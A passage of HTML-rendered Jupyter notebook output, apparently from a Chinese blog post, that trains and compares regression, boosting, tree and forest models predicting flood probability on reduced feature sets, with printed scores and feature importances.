class=\"string\">&#x27;模型&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;熵值&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<pre><code>当前模型为linear.pkl\n[2 2 2 ... 2 2 1]\n\n\nC:\\Users\\12780\\AppData\\Local\\Temp\\ipykernel_25292\\1261529529.py:28: SettingWithCopyWarning: \nA value is trying to be set on a copy of a slice from a DataFrame.\nTry using .loc[row_indexer,col_indexer] = value instead\n\nSee the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n  temp['洪水概率']=dic[f'[&#123;i&#125;]']\n\n\n当前模型为gb_tree.pkl\n[2 2 2 ... 2 2 1]\n\n\nC:\\Users\\12780\\AppData\\Local\\Temp\\ipykernel_25292\\1261529529.py:28: SettingWithCopyWarning: \nA value is trying to be set on a copy of a slice from a DataFrame.\nTry using .loc[row_indexer,col_indexer] = value instead\n\nSee the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n  temp['洪水概率']=dic[f'[&#123;i&#125;]']\n\n\n当前模型为ju_tree.pkl\n[2 0 2 ... 2 0 1]\n\n\nC:\\Users\\12780\\AppData\\Local\\Temp\\ipykernel_25292\\1261529529.py:28: SettingWithCopyWarning: \nA value is trying to be set on a copy of a slice from a DataFrame.\nTry using .loc[row_indexer,col_indexer] = value instead\n\nSee the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n  temp['洪水概率']=dic[f'[&#123;i&#125;]']\n\n\n当前模型为rf_forest.pkl\n[2 2 2 ... 2 2 2]\n\n\nC:\\Users\\12780\\AppData\\Local\\Temp\\ipykernel_25292\\1261529529.py:28: SettingWithCopyWarning: \nA value is trying to be set on a copy of a slice from a DataFrame.\nTry using .loc[row_indexer,col_indexer] = value instead\n\nSee the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n  temp['洪水概率']=dic[f'[&#123;i&#125;]']\n\n\n当前模型为logistic.pkl\n[2 2 2 ... 2 2 1]\n\n\nC:\\Users\\12780\\AppData\\Local\\Temp\\ipykernel_25292\\1261529529.py:28: SettingWithCopyWarning: \nA value is trying to be set on a copy of a slice from a DataFrame.\nTry using .loc[row_indexer,col_indexer] = value instead\n\nSee the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n  temp['洪水概率']=dic[f'[&#123;i&#125;]']\n</code></pre>\n<p><img data-src=\"output_77_10.png\" alt=\"png\" /></p>\n<h2 id=\"problem-three-从不同指标集建立洪水的预测模型\"><a class=\"anchor\" href=\"#problem-three-从不同指标集建立洪水的预测模型\">#</a> Problem THREE 从不同指标集建立洪水的预测模型</h2>\n<h3 id=\"利用半指标集重新训练模型\"><a class=\"anchor\" href=\"#利用半指标集重新训练模型\">#</a> 利用半指标集重新训练模型</h3>\n<h4 id=\"数据读入与划分\"><a class=\"anchor\" href=\"#数据读入与划分\">#</a> 数据读入与划分</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">train_data = train_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\">X=train_data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">X=X[ten_columns]</span><br><span class=\"line\">y=train_data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">y=np.array(y)</span><br><span class=\"line\">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class=\"number\">0.2</span>, random_state=<span class=\"number\">42</span>)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"多元线性回归\"><a class=\"anchor\" href=\"#多元线性回归\">#</a> 多元线性回归</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> accuracy_score</span><br><span class=\"line\">model_line=LinearRegression()</span><br><span class=\"line\">model_line.fit(X_train,y_train)</span><br><span class=\"line\">y_pred = model_line.predict(X_test)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\">score = model_line.score(X_test,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model score: <span class=\"subst\">&#123;score&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;均方误差为: <span class=\"subst\">&#123;mse&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;模型的系数为: <span class=\"subst\">&#123;model_line.coef_&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;模型的截距为: <span class=\"subst\">&#123;model_line.intercept_&#125;</span>&quot;</span>)</span><br><span class=\"line\">accuracy = cosine(y_test,y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;accuracy&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model score: 0.37461847859805275\n均方误差为: 0.0016255673314973993\n模型的系数为: [0.00507833 0.00501385 0.00495665 0.00492889 0.00504095 0.00491355\n 0.00504961 0.00504281 0.0050641  0.00502683]\n模型的截距为: 0.2568960934135129\n余弦相似度为0.9968319141241095\n</code></pre>\n<h4 id=\"梯度提升树\"><a class=\"anchor\" href=\"#梯度提升树\">#</a> 梯度提升树</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sklearn.ensemble <span class=\"keyword\">import</span> GradientBoostingRegressor</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.tree <span class=\"keyword\">import</span> plot_tree</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> mean_squared_error</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.model_selection <span class=\"keyword\">import</span> cross_val_score</span><br><span class=\"line\">n_estimators = <span class=\"number\">1200</span></span><br><span class=\"line\">gb_model = GradientBoostingRegressor(n_estimators=n_estimators, random_state=<span class=\"number\">42</span>)</span><br><span class=\"line\">gb_model.fit(X_train, y_train)</span><br><span class=\"line\"><span class=\"comment\"># 在测试集上评估模型性能</span></span><br><span class=\"line\">gb_score  = gb_model.score(X_test,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model Score : <span class=\"subst\">&#123;gb_score&#125;</span>&#x27;</span>)</span><br><span class=\"line\">feature_importances = gb_model.feature_importances_</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;特征重要性:&quot;</span>, feature_importances)</span><br><span class=\"line\"><span class=\"comment\"># 计算每轮迭代的损失值</span></span><br><span class=\"line\">train_loss = np.zeros((gb_model.n_estimators,), dtype=np.float64)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, y_pred <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(gb_model.staged_predict(X_train)):</span><br><span class=\"line\">    train_loss[i] = mean_squared_error(y_train, y_pred)</span><br><span class=\"line\"></span><br><span class=\"line\">test_loss = np.zeros((gb_model.n_estimators,), dtype=np.float64)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, y_pred <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(gb_model.staged_predict(X_test)):</span><br><span class=\"line\">    test_loss[i] = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\"><span class=\"comment\"># 在测试集上进行预测</span></span><br><span class=\"line\">y_pred = gb_model.predict(X_test)</span><br><span class=\"line\">theta = cosine(y_pred,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;theta&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 计算均方误差</span></span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;均方误差为<span class=\"subst\">&#123;mse&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 绘制损失曲线</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">10</span>, <span class=\"number\">6</span>))</span><br><span class=\"line\">plt.plot(np.arange(<span class=\"number\">1</span>, gb_model.n_estimators + <span class=\"number\">1</span>), train_loss, label=<span class=\"string\">&#x27;Training Loss&#x27;</span>)</span><br><span class=\"line\">plt.plot(np.arange(<span class=\"number\">1</span>, gb_model.n_estimators + <span class=\"number\">1</span>), test_loss, label=<span class=\"string\">&#x27;Test Loss&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Number of Iterations&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Mean Squared Error&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Training and Test Loss&#x27;</span>)</span><br><span class=\"line\">plt.legend()</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"><span class=\"comment\"># 可视化特征重要性</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">30</span>, <span class=\"number\">18</span>))</span><br><span class=\"line\">plt.bar(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(feature_importances)), feature_importances, tick_label=[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;X_train.columns[i]&#125;</span>&#x27;</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(feature_importances))])</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Feature&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Importance&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Feature Importance&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model Score : 0.378759314749781\n特征重要性: [0.10139095 0.10060794 0.09787091 0.09610327 0.09900577 0.09537671\n 0.10140741 0.10290733 0.10224735 0.10308238]\n余弦相似度为0.996852927605829\n均方误差为0.0016148039690650664\n</code></pre>\n<p><img data-src=\"output_85_1.png\" alt=\"png\" /></p>\n<p><img data-src=\"output_85_2.png\" alt=\"png\" /></p>\n<h4 id=\"决策树\"><a class=\"anchor\" href=\"#决策树\">#</a> 决策树</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.model_selection <span class=\"keyword\">import</span> cross_val_score</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.tree <span class=\"keyword\">import</span> plot_tree</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> mean_squared_error</span><br><span class=\"line\">tree_model = DecisionTreeRegressor(random_state=<span class=\"number\">42</span>)</span><br><span class=\"line\">tree_model.fit(X_train, y_train)</span><br><span class=\"line\">tree_score = tree_model.score(X_test, y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Model Score :&quot;</span>, tree_score)</span><br><span class=\"line\">feature_importances = tree_model.feature_importances_</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;特征重要性:&quot;</span>, feature_importances)</span><br><span class=\"line\">feature_importances_flat = np.ravel(feature_importances)</span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">30</span>, <span class=\"number\">18</span>))</span><br><span class=\"line\">plt.bar(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(feature_importances_flat)), feature_importances_flat, tick_label=[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;X_train.columns[i]&#125;</span>&#x27;</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(feature_importances_flat))])</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Feature&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Importance&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Feature Importance&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\">y_pred = tree_model.predict(X_test)</span><br><span class=\"line\">theta = cosine(y_pred,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;theta&#125;</span>&#x27;</span>)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;均方误差为<span class=\"subst\">&#123;mse&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model Score : -0.37999290530770646\n特征重要性: [0.09880106 0.09983387 0.10125522 0.10165829 0.10035667 0.10129578\n 0.09900273 0.09949576 0.0994488  0.09885181]\n</code></pre>\n<p><img data-src=\"output_87_1.png\" alt=\"png\" /></p>\n<pre><code>余弦相似度为0.9930189485511745\n均方误差为0.003587044560474931\n</code></pre>\n<h4 id=\"随机森林\"><a class=\"anchor\" href=\"#随机森林\">#</a> 随机森林</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rf = RandomForestRegressor(n_estimators=<span class=\"number\">4</span>, random_state=<span class=\"number\">42</span>)  <span class=\"comment\"># 使用100棵树</span></span><br><span class=\"line\">rf.fit(X_train, y_train)</span><br><span class=\"line\">y_pred = rf.predict(X_test)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\">score = rf.score(X_test,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model score: <span class=\"subst\">&#123;score&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;均方误差为: <span class=\"subst\">&#123;mse&#125;</span>&quot;</span>)</span><br><span class=\"line\">accuracy = cosine(y_test,y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;accuracy&#125;</span>&#x27;</span>)</span><br><span class=\"line\">feature_importances = rf.feature_importances_</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;特征重要性:&quot;</span>, feature_importances)</span><br><span class=\"line\">feature_importances_flat = np.ravel(feature_importances)</span><br><span class=\"line\"><span class=\"comment\"># 可视化特征重要性</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">30</span>, <span class=\"number\">18</span>))</span><br><span class=\"line\">plt.bar(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(feature_importances_flat)), feature_importances_flat, tick_label=[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;X_train.columns[i]&#125;</span>&#x27;</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(feature_importances_flat))])</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Feature&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Importance&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Feature Importance&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model score: 0.15691875212778306\n均方误差为: 0.002191438805653956\n余弦相似度为0.9957272905379122\n特征重要性: [0.09854545 0.10019614 0.10220218 0.1030608  0.1000937  0.10149794\n 0.09828828 0.0987665  0.09905775 0.09829126]\n</code></pre>\n<p><img data-src=\"output_89_1.png\" alt=\"png\" /></p>\n<h3 id=\"利用核心指标集重新训练模型\"><a class=\"anchor\" href=\"#利用核心指标集重新训练模型\">#</a> 利用核心指标集重新训练模型</h3>\n<h4 id=\"数据读入-3\"><a class=\"anchor\" href=\"#数据读入-3\">#</a> 数据读入</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">train_data = train_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\">X=train_data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 在这里进行数据指标的选择</span></span><br><span class=\"line\">X=X[five_columns]</span><br><span class=\"line\">y=train_data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">y=np.array(y)</span><br><span class=\"line\"><span class=\"comment\">#y=-np.log(1/y-1)</span></span><br><span class=\"line\">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class=\"number\">0.2</span>, random_state=<span class=\"number\">42</span>)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"多元线性回归-2\"><a class=\"anchor\" href=\"#多元线性回归-2\">#</a> 多元线性回归</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> accuracy_score</span><br><span class=\"line\">model_line=LinearRegression()</span><br><span class=\"line\">model_line.fit(X_train,y_train)</span><br><span class=\"line\">y_pred = model_line.predict(X_test)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\">score = model_line.score(X_test,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model score: <span class=\"subst\">&#123;score&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;均方误差为: <span class=\"subst\">&#123;mse&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;模型的系数为: <span class=\"subst\">&#123;model_line.coef_&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;模型的截距为: <span class=\"subst\">&#123;model_line.intercept_&#125;</span>&quot;</span>)</span><br><span class=\"line\">accuracy = cosine(y_test,y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;accuracy&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model score: 0.181427445558773\n均方误差为: 0.0021277328437480304\n模型的系数为: [0.00482241 0.00476873 0.00479914 0.00474271 0.00475476]\n模型的截距为: 0.38645331900338376\n余弦相似度为0.9958512145383939\n</code></pre>\n<h4 id=\"梯度提升树-2\"><a class=\"anchor\" href=\"#梯度提升树-2\">#</a> 梯度提升树</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sklearn.ensemble <span class=\"keyword\">import</span> GradientBoostingRegressor</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.tree <span class=\"keyword\">import</span> plot_tree</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> mean_squared_error</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.model_selection <span class=\"keyword\">import</span> cross_val_score</span><br><span class=\"line\"><span class=\"comment\"># 设置迭代次数为100</span></span><br><span class=\"line\">n_estimators = <span class=\"number\">1000</span></span><br><span class=\"line\"><span class=\"comment\"># 创建并训练梯度提升树回归模型</span></span><br><span class=\"line\">gb_model = GradientBoostingRegressor(n_estimators=n_estimators, random_state=<span class=\"number\">42</span>)</span><br><span class=\"line\">gb_model.fit(X_train, y_train)</span><br><span class=\"line\"><span class=\"comment\"># 在测试集上评估模型性能</span></span><br><span class=\"line\">gb_score  = gb_model.score(X_test,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model Score : <span class=\"subst\">&#123;gb_score&#125;</span>&#x27;</span>)</span><br><span class=\"line\">feature_importances = gb_model.feature_importances_</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;特征重要性:&quot;</span>, feature_importances)</span><br><span class=\"line\"><span class=\"comment\"># 计算每轮迭代的损失值</span></span><br><span class=\"line\">train_loss = np.zeros((gb_model.n_estimators,), dtype=np.float64)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, y_pred <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(gb_model.staged_predict(X_train)):</span><br><span class=\"line\">    train_loss[i] = mean_squared_error(y_train, y_pred)</span><br><span class=\"line\"></span><br><span class=\"line\">test_loss = np.zeros((gb_model.n_estimators,), dtype=np.float64)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, y_pred <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(gb_model.staged_predict(X_test)):</span><br><span class=\"line\">    test_loss[i] = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\"><span class=\"comment\"># 在测试集上进行预测</span></span><br><span class=\"line\">y_pred = gb_model.predict(X_test)</span><br><span class=\"line\">theta = cosine(y_pred,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;theta&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 计算均方误差</span></span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;均方误差为<span class=\"subst\">&#123;mse&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 绘制损失曲线</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">10</span>, <span class=\"number\">6</span>))</span><br><span class=\"line\">plt.plot(np.arange(<span class=\"number\">1</span>, gb_model.n_estimators + <span class=\"number\">1</span>), train_loss, label=<span class=\"string\">&#x27;Training Loss&#x27;</span>)</span><br><span class=\"line\">plt.plot(np.arange(<span class=\"number\">1</span>, gb_model.n_estimators + <span class=\"number\">1</span>), test_loss, label=<span class=\"string\">&#x27;Test Loss&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Number of Iterations&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Mean Squared Error&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Training and Test Loss&#x27;</span>)</span><br><span class=\"line\">plt.legend()</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model Score : 0.18546794557325652\n特征重要性: [0.20028747 0.20177494 0.20162684 0.20300577 0.19330498]\n余弦相似度为0.9958717349992869\n均方误差为0.002117230287145886\n</code></pre>\n<p><img data-src=\"output_96_1.png\" alt=\"png\" /></p>\n<h4 id=\"决策树-2\"><a class=\"anchor\" href=\"#决策树-2\">#</a> 决策树</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span 